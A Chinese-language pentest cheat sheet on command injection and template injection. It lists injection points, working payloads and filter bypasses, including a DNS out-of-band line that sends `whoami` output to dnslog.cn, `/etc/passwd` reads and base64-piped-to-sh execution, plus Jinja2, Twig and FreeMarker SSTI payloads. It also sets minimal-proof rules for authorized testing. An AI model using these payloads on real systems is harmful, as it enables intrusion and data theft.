# 命令注入与 RCE

## 触发点
- ping/nslookup 类工具调用、文件处理（ffmpeg/imagemagick）、导出功能（拼系统命令）
- 模板注入 SSTI：Jinja2/Twig/FreeMarker/Velocity 用户输入进模板
- 表达式注入：EL/OGNL（Struts2）、SpEL（Spring）、JEXL
- 反序列化触发（详见 deserialization-rce.md）

## 命令注入 Payload
- 拼接符：`;` `|` `||` `&&` `` ` `` `$()` 换行 `%0a`
- 无回显盲注：时间延迟 `sleep 5`、DNS 带外 `ping $(whoami).dnslog.cn`、写文件到可访问目录
- 过滤绕过：空格 `$IFS`、`${IFS}`、`{a,b}` 花括号、`cat</etc/passwd`
- 编码：base64 `echo base64|base64 -d|sh`、hex、变量拼接 `c''at`
- 参数注入：`--help`/`--output=` 覆盖文件、`--upload-file` 利用 curl/wget 参数

## SSTI 快速验证
- 探测：`{{7*7}}` 返回 49
- Jinja2：`{{config}}`、`{{''.__class__.__mro__[1].__subclasses__()}}`
- Twig：`{{_self.env.registerUndefinedFilterCallback('system')}}`
- FreeMarker：`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
- 识别引擎：`{{7*7}}`/`${7*7}` 响应差异

## 最小化验证
- 用 `id`/`whoami`/`pwd` 类只读命令证明执行，不写文件不弹 shell
- 带外验证用自建 dnslog 域名
- 绝不反弹 shell 到公网、不横向移动

## 报告要点
- 触发点 + payload + 回显/带外证据、执行身份、可写目录范围（仅证明可达）
